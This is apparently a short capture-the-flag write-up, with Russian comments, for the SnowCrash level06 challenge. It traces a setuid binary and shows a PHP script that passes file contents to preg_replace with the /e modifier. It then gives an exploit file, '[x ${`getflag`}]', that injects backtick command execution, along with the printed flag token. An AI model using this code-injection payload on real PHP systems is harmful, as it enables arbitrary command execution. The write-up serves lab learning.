```bash
level06@SnowCrash:~$ strace ./level06
....
open("/home/user/level06/level06.php", O_RDONLY|O_LARGEFILE) = 3
fstat64(3, {st_mode=S_IFREG|0750, st_size=356, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
read(3, "#!/usr/bin/php\n<?php\nfunction y("..., 4096) = 356
brk(0x89f0000)                          = 0x89f0000
rt_sigaction(SIGPROF, {0x830ec40, [PROF], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0
time(NULL)                              = 1607603390
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
_llseek(0, 0, 0xbffff130, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd7000
_llseek(1, 0, 0xbffff130, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
fstat64(2, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
fstat64(2, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
_llseek(2, 0, 0xbffff130, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
time(NULL)                              = 1607603390
lstat64("/home/user/level06/level06.php", {st_mode=S_IFREG|0750, st_size=356, ...}) = 0
lstat64("/home/user/level06", {st_mode=S_IFDIR|0550, st_size=140, ...}) = 0
lstat64("/home/user", {st_mode=S_IFDIR|0111, st_size=340, ...}) = 0
lstat64("/home", {st_mode=S_IFDIR|0111, st_size=80, ...}) = 0
_llseek(3, 0, [356], SEEK_CUR)          = 0
ioctl(3, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfffcfb8) = -1 ENOTTY (Inappropriate ioctl for device)
fstat64(3, {st_mode=S_IFREG|0750, st_size=356, ...}) = 0
mmap2(NULL, 388, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd6000
munmap(0xb7fd6000, 341)                 = 0
close(3)                                = 0
munmap(0xb7fd9000, 4096)                = 0
write(2, "PHP Warning:  file_get_contents("..., 104PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
) = 104
....
```
Бинарник запускает ./level06.php и подсовывает в него аргументы

```bash
level06@SnowCrash:~$ cat ./level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Нас интерисует строчка, в которой читается дата из файла и подсовывается в preg_replace с модификатором /e, который выполнить .* и передаст это в функцию y
```bash
$a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

```bash
level06@SnowCrash:~$ cat /tmp/exploit
[x ${`getflag`}]
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
